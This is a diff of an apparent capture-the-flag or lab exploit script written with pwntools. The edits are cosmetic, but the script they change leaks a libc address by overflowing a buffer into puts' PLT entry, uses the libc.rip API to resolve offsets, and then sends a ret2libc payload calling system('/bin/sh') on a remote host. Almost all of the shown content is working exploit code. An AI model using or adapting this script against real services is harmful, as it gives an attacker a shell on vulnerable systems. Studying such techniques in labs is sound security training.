@@ -11,20 +11,18 @@ LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
 HEADERS = {'Content-Type': 'application/json'}
 PLT_PUTS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x804847b, 0x80497ac
 
-
-def leak_via_puts(conn, port,puts_got_addr, msg="puts"):
+def leak_via_puts(conn, port,puts_got_addr):
     """
     Leaks randomised libc address via puts' PLT and function's GOT.
     """
-    global proc 
-    
+    global proc
     proc = remote(conn,port)
     payload = b'A' * BUFF_SIZE + p32(PLT_PUTS) + p32(MAIN_ADDR) + p32(puts_got_addr)
     proc.sendline(payload)
     skip_lines(proc, OUTPUT_LINES_BEFORE)
     puts_addr = u32(proc.recv(4))
     skip_lines(proc, OUTPUT_LINES_AFTER)
-    log.success(f"Leaked address of {msg}: {hex(puts_addr)}")
+    log.success(f"Leaked address of puts: {hex(puts_addr)}")
     return puts_addr
 
 
@@ -47,7 +45,7 @@ def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
     binsh_addr = libc_base + binsh_offset
     
     # Create and send system('/bin/sh') buffer overflow payload
-    payload = b'A' * BUFF_SIZE +p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
+    payload = b'A' * BUFF_SIZE + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
 
     proc.sendline(payload)
     log.success("Triggered system('/bin/sh') via buffer overflow.")
